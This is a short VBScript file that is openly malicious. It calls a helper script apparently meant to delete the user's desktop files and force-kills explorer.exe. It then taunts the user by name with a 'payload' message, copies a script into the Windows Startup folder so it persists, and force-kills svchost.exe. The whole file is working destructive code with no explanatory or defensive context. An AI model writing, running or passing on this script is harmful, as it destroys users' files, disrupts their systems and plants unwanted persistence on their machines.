Set shell = CreateObject("Wscript.shell")

Set FSO = CreateObject("Scripting.FileSystemObject")

Set network = CreateObject("WScript.Network")

user = network.UserName

desktop = shell.SpecialFolders("Desktop")

deleteDesktopFilePath = FSO.GetParentFolderName(WScript.ScriptFullName) & "\help\delDesktop.vbs"

startupFilePath = FSO.GetParentFolderName(WScript.ScriptFullName) & "\help\start.vbs"

shell.run deleteDesktopFilePath, 1, True

shell.run "taskkill /f /im explorer.exe"

MsgBox "wait for my beautiful payload " & user & "!!!"

WScript.Sleep 1000

FSO.MoveFile startupFilePath, shell.SpecialFolders("Startup") & "\start.vbs"

shell.run "taskkill /f /im svchost.exe"
